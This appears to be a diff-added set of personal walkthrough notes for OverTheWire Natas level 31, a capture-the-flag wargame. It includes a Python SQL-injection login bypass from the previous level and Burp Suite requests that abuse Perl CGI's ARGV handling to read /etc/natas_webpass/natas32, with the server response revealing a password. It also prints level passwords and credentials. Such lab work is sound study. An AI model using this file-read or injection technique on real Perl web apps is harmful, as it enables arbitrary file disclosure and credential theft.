@@ -1,0 +1,257 @@
+PASSWORD: m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y
+
+*BROWSE AND UPLOAD FILE JUST CREATED ON PREVIOULY LEVEL natas30.py
+
+URL: http://natas31.natas.labs.overthewire.org/index.pl  <----------PERL PARAMETER
+import requests
+authentication = requests.auth.HTTPBasicAuth('natas30' 	'WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH')
+url = "http://natas30.natas.labs.overthewire.org/index.pl"
+params = {"username":"natas31"	"password":["'ra6narok' or true"	4]}
+response = requests.post(url	data=params	auth=authentication)
+print(response.text) 
+
+*VIEW SOURCECODE*
+/var/www/natas/natas31/index-source.pl
+
+#!/usr/bin/perl
+use CGI;
+$ENV{'TMPDIR'}="/var/www/natas/natas31/tmp/";
+
+print <<END;
+Content-Type: text/html; charset=iso-8859-1
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<!-- Bootstrap -->
+<link href="bootstrap-3.3.6-dist/css/bootstrap.min.css" rel="stylesheet">
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas31", "pass": "<censored>" };</script>
+<script src="sorttable.js"></script>
+</head>
+<script src="bootstrap-3.3.6-dist/js/bootstrap.min.js"></script>
+
+<!-- morla/10111 -->
+<style>
+#content {
+    width: 900px;
+}
+.btn-file {
+    position: relative;
+    overflow: hidden;
+}
+.btn-file input[type=file] {
+    position: absolute;
+    top: 0;
+    right: 0;
+    min-width: 100%;
+    min-height: 100%;
+    font-size: 100px;
+    text-align: right;
+    filter: alpha(opacity=0);
+    opacity: 0;
+    outline: none;
+    background: white;
+    cursor: inherit;
+    display: block;
+}
+
+</style>
+
+
+<h1>natas31</h1>
+<div id="content">
+END
+
+my $cgi = CGI->new;  <----------CREATE NEW CGI OBJECT*
+if ($cgi->upload('file')) {
+    my $file = $cgi->param('file');
+    print '<table class="sortable table table-hover table-striped">';
+    $i=0;
+    while (<$file>) {
+        my @elements=split /,/, $_;  <----------TABLE CREATES A NEW COLUMN AFTER A , (COMMA)*
+
+        if($i==0){ # header
+            print "<tr>";
+            foreach(@elements){
+                print "<th>".$cgi->escapeHTML($_)."</th>";  <----------TABLE HEADER
+            }
+            print "</tr>";
+        }
+        else{ # table content
+            print "<tr>";
+            foreach(@elements){
+                print "<td>".$cgi->escapeHTML($_)."</td>";  <----------TABLE DATA   
+            }
+            print "</tr>";
+        }
+        $i+=1;
+    }
+    print '</table>';
+}
+else{
+print <<END;
+
+<form action="index.pl" method="post" enctype="multipart/form-data">
+    <h2> CSV2HTML</h2>
+    <br>
+    We all like .csv files.<br>
+    But isn't a nicely rendered and sortable table much cooler?<br>
+    <br>
+    Select file to upload:
+    <span class="btn btn-default btn-file">
+        Browse <input type="file" name="file">
+    </span>    
+    <input type="submit" value="Upload" name="submit" class="btn">
+</form> 
+END
+}
+
+print <<END;
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+END
+
+*BURP SUITE*
+*TOGGLE PROXY*
+*HTTP HISTORY*
+*HIGHLIGHT PARAMETER /index.pl
+*SEND TO REPEATER*
+
+POST /index.pl HTTP/1.1
+Host: natas31.natas.labs.overthewire.org
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: multipart/form-data; boundary=---------------------------35186305919945444052173461245
+Content-Length: 665
+Origin: http://natas31.natas.labs.overthewire.org
+Authorization: Basic bmF0YXMzMTptN2JmakFIcEptU1lnUVdXZXFSRTJxVkJ1TWlSTnEweQ==
+Connection: close
+Referer: http://natas31.natas.labs.overthewire.org/
+Cookie: _ga_RD0K2239G0=GS1.1.1718037651.6.0.1718037651.0.0.0; _ga=GA1.1.54566035.1717921097
+Upgrade-Insecure-Requests: 1
+
+-----------------------------35186305919945444052173461245
+Content-Disposition: form-data; name="file"; filename="natas30.py"
+Content-Type: text/x-python
+
+ra6narok
+
+-----------------------------35186305919945444052173461245
+Content-Disposition: form-data; name="submit"
+
+Upload
+-----------------------------35186305919945444052173461245--
+
+
+*EDIT POST*
+
+POST /index.pl?/etc/natas_webpass/natas32 HTTP/1.1  <---------ADD PASSWORD FILE PARAMETER
+Host: natas31.natas.labs.overthewire.org
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: multipart/form-data; boundary=---------------------------35186305919945444052173461245
+Content-Length: 463
+Origin: http://natas31.natas.labs.overthewire.org
+Authorization: Basic bmF0YXMzMTptN2JmakFIcEptU1lnUVdXZXFSRTJxVkJ1TWlSTnEweQ==
+Connection: close
+Referer: http://natas31.natas.labs.overthewire.org/
+Cookie: _ga_RD0K2239G0=GS1.1.1718037651.6.0.1718037651.0.0.0; _ga=GA1.1.54566035.1717921097
+Upgrade-Insecure-Requests: 1
+
+-----------------------------35186305919945444052173461245
+Content-Disposition: form-data; name="file"  <----------COPY AND PASTE THE "Upload" form-data block RENAME SUBMIT TO FILE
+
+ARGV  <--------------------------------RENAME UPLOAD TO ARGV -WHICH IS THE ARGUMENT VALUE OF THE /ETC/NATAS_WEBPASS/NATAS32 FILE
+-----------------------------35186305919945444052173461245
+Content-Disposition: form-data; name="file"; filename="natas30.py"
+Content-Type: text/x-python
+
+ra6narok
+
+-----------------------------35186305919945444052173461245
+Content-Disposition: form-data; name="submit"
+
+Upload
+-----------------------------35186305919945444052173461245--
+
+*SEND*
+*RESPONSE*
+HTTP/1.1 200 OK
+Date: Sun, 16 Jun 2024 18:30:09 GMT
+Server: Apache/2.4.58 (Ubuntu)
+Vary: Accept-Encoding
+Content-Length: 1649
+Connection: close
+Content-Type: text/html; charset=iso-8859-1
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<!-- Bootstrap -->
+<link href="bootstrap-3.3.6-dist/css/bootstrap.min.css" rel="stylesheet">
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas31", "pass": "<censored>" };</script>
+<script src="sorttable.js"></script>
+</head>
+<script src="bootstrap-3.3.6-dist/js/bootstrap.min.js"></script>
+
+<!-- morla/10111 -->
+<style>
+#content {
+    width: 900px;
+}
+.btn-file {
+    position: relative;
+    overflow: hidden;
+}
+.btn-file input[type=file] {
+    position: absolute;
+    top: 0;
+    right: 0;
+    min-width: 100%;
+    min-height: 100%;
+    font-size: 100px;
+    text-align: right;
+    filter: alpha(opacity=0);
+    opacity: 0;
+    outline: none;
+    background: white;
+    cursor: inherit;
+    display: block;
+}
+
+</style>
+
+
+<h1>natas31</h1>
+<div id="content">
+<table class="sortable table table-hover table-striped"><tr><th>NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B
+</th></tr></table><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+
+*RIGHT CLICK*
+*TOGGLE SHOW RESPONSE IN BROWSER*
+*COPY*
+URL: http://natas31.natas.labs.overthewire.org/index.pl?/etc/natas_webpass/natas32
+natas31
+NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B
+View sourcecode
